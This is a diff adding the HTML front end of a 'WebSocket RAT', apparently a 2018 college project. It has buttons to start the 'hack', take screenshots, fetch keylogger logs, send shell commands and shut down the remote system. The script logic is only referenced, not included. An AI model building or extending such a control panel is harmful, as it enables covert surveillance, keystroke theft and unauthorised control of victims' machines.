@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>WebSocket Remote Access</title>
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <!-- Favicons
+    ================================================== -->
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" href="img/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="img/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="img/apple-touch-icon-114x114.png">
+    <!-- Bootstrap -->
+    <link rel="stylesheet" type="text/css"  href="css/bootstrap.css">
+    <link rel="stylesheet" type="text/css" href="fonts/font-awesome/css/font-awesome.css">
+    <!-- Stylesheet
+    ================================================== -->
+    <link rel="stylesheet" type="text/css"  href="css/style.css">
+    <link rel="stylesheet" type="text/css" href="css/nivo-lightbox/nivo-lightbox.css">
+    <link rel="stylesheet" type="text/css" href="css/nivo-lightbox/default.css">
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,700,800,600,300' rel='stylesheet' type='text/css'>
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  </head>
+  <body id="page-top" data-spy="scroll" data-target=".navbar-fixed-top">
+    <!-- Header -->
+    <header id="header">
+      <div class="intro">
+        <div class="container">
+          <div class="row">
+            <div class="intro-text">
+              <h1>WebSocket RAT</h1>
+              <hr>
+              <p>&Lcedil;&eogon;&Aogon;&reg;&ENG; • C0de • H@ck</p>
+              <a href="#about" class="btn btn-default btn-lg page-scroll">Learn More</a> </div>
+            </div>
+          </div>
+        </div>
+      </header>
+      <!-- Navigation -->
+      <div id="nav">
+        <nav class="navbar navbar-custom">
+          <div class="container">
+            <div class="navbar-header">
+              <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-main-collapse"> <i class="fa fa-bars"></i> </button>
+            </div>
+            
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse navbar-main-collapse">
+              <ul class="nav navbar-nav">
+                <!-- Hidden li included to remove active class from about link when scrolled up past about section -->
+                <li class="hidden"> <a href="#page-top"></a> </li>
+                <li> <a class="page-scroll" href="#about">About</a> </li>
+                <li> <a class="page-scroll" href="#Shell">Shell</a> </li>
+                <li> <a class="page-scroll" href="#contact">Contact</a> </li>
+              </ul>
+            </div>
+          </div>
+        </nav>
+      </div>
+      <!-- About Section -->
+      <div id="about">
+        <div class="container">
+          <div class="section-title text-center center">
+            <h2>About Us</h2>
+            <hr>
+          </div>
+          <div class="row">
+            <div class="col-md-12 text-center"><img src="img/about.png" class="img-responsive"></div>
+            <div class="col-md-8 col-md-offset-2">
+              <div class="about-text">
+                <p> Works on the principle of websockets. </p>
+                <p>The quiter you are the more you are able to hear.</p>
+                <a href="#Shell" class="btn btn-default btn-lg page-scroll">My Shell</a> </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!--Modal Section -->
+        <div class="modal fade" id="exampleModal3" tabindex="-1" role="dialog" aria-labelledby="exampleModal3Label" aria-hidden="true">
+          <div class="modal-dialog" role="document">
+            <div class="modal-content">
+              <div class="modal-header">
+                <h5 class="modal-title" id="exampleModal3Label">Modal title</h5>
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                <span aria-hidden="true">×</span>
+                </button>
+              </div>
+              <div id="modal-body" class="modal-body">
+                
+              </div>
+              <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                <button type="button" onclick="getLog();" class="btn btn-primary">Get Log</button>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!--Modal Section -->
+        <!-- Shell Section -->
+        <div id="Shell">
+          <div class="container">
+            <div class="section-title text-center center">
+              <h2 class="panel-heading">Shell</h2>
+              <div align="center" class="panel panel-default" id="shell_panel">
+                <button class="btn btn-warning" onclick="invokeWebSocket();">Start hack!</button>
+                <br>
+                <br>
+                <div>
+                  Functions:
+                  <br>
+                  <button class="btn btn-success" onclick="getScreenshot();">Get Screeshot!</button>
+                  <button type="button" id="getLog" class="btn btn-primary" data-toggle="modal" data-target="#exampleModal3">
+                  Key Log Info
+                  </button>
+                  <div id="image_link" class="bg-danger text-white"></div>
+                </div>
+                <p id="systemInfo" style="padding-top: 20px;"></p>
+
+                <form onsubmit="onSubmit(); return false;">
+                  <div style="height: 50px; padding-top: 10px; width: 600px;">
+                    <input type="text" class="form-control" id="input" placeholder="Enter Your Command Here!">
+                  </div>
+                  <br>
+                  <input type="submit" class="btn btn-primary" value="Send">
+                  <button class="btn btn-success" onclick="onCloseClick(); return false;">close</button>
+                </form>
+
+                <br>
+                <div id="currentWorkingDir"></div>
+              <pre id="stdout"></pre>
+              <div id="stderr"></div>
+              <div style="height: 50px; width: 200px" class="bg-info text-white" id="log"></div>
+              <br>
+              <button class="btn btn-danger" onclick="shutdownNow()">Shutdown system</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Contact Section -->
+    <div id="contact" class="text-center">
+      <div class="container">
+        <div class="section-title center">
+          <h2>Get In Touch</h2>
+          <hr>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+          <form name="sentMessage" id="contactForm">
+            <div class="row">
+              <div class="col-md-6">
+                <div class="form-group">
+                  <input type="text" id="name" class="form-control" placeholder="Name" required="">
+                  <p class="help-block text-danger"></p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="form-group">
+                  <input type="email" id="email" class="form-control" placeholder="Email" required="">
+                  <p class="help-block text-danger"></p>
+                </div>
+              </div>
+            </div>
+            <div class="form-group">
+              <textarea name="message" id="message" class="form-control" rows="4" placeholder="Message" required=""></textarea>
+              <p class="help-block text-danger"></p>
+            </div>
+            <div id="success"></div>
+            <button type="submit" class="btn btn-default btn-lg">Send Message</button>
+          </form>
+          <div class="social">
+            <ul>
+              <li><a href="#"><i class="fa fa-facebook"></i></a></li>
+              <li><a href="#"><i class="fa fa-twitter"></i></a></li>
+              <li><a href="#"><i class="fa fa-dribbble"></i></a></li>
+              <li><a href="#"><i class="fa fa-behance"></i></a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="footer">
+      <div class="container text-center">
+        <div class="fnav">
+          <p>Copyright &copy; 2018 Wadia College. Designed by Deepesh Nair - Chetan Kardile - Vaibhav Nimbalkar ; Guide : <b><i>Prof. Rashmi Baghel</b></i></p>
+        </div>
+      </div>
+    </div>
+    <script type="text/javascript" src="js/jquery.1.11.1.js"></script>
+    <script type="text/javascript" src="js/functions.js"></script>
+    <script type="text/javascript" src="js/bootstrap.js"></script>
+    <script type="text/javascript" src="js/SmoothScroll.js"></script>
+    <script type="text/javascript" src="js/nivo-lightbox.js"></script>
+    <script type="text/javascript" src="js/jquery.isotope.js"></script>
+    <script type="text/javascript" src="js/contact_me.js"></script>
+    <script type="text/javascript" src="js/main.js"></script>
+  </body>
+</html>
